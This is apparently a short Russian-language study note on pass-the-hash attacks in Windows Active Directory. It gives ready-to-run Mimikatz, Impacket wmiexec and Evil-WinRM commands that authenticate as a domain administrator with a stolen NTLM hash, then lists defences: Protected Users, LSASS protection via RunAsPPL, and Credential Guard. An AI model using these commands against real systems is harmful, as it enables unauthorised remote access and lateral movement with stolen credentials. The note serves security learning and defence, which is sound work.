#windows #AD #attacks 

> Нужен только NTLM хэш пользователя
## Mimikatz
```mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:e45a314c664d40a227f9540121d1a29d /run:cmd.exe
```

# Impacket 
```bash
python3 wmiexec.py -hashes :<NTLM_hash> corp.local/Administrator@TARGET_IP
```


# Evil-WinRM
```bash
evil-winrm -i <IP> -u <user> -H <NTLM hash>
```

# Защита

### 1) Если пользователь в группе Protected Users:

Windows:
- не хранит NT hash в памяти
- требует AES Kerberos
- запрещает NTLM
Overpass‑the‑Hash становится невозможен.

### 2) LSASS protection

Включить RunAsPPL
LSASS становится protected process.
[[Mimikatz]] не сможет читать память.

### 3) Credential Guard

Функция Windows, которая защищает LSASS.
Credential Guard:
- изолирует NT hashes
- использует virtualization‑based security
attacker не может извлечь NT hash.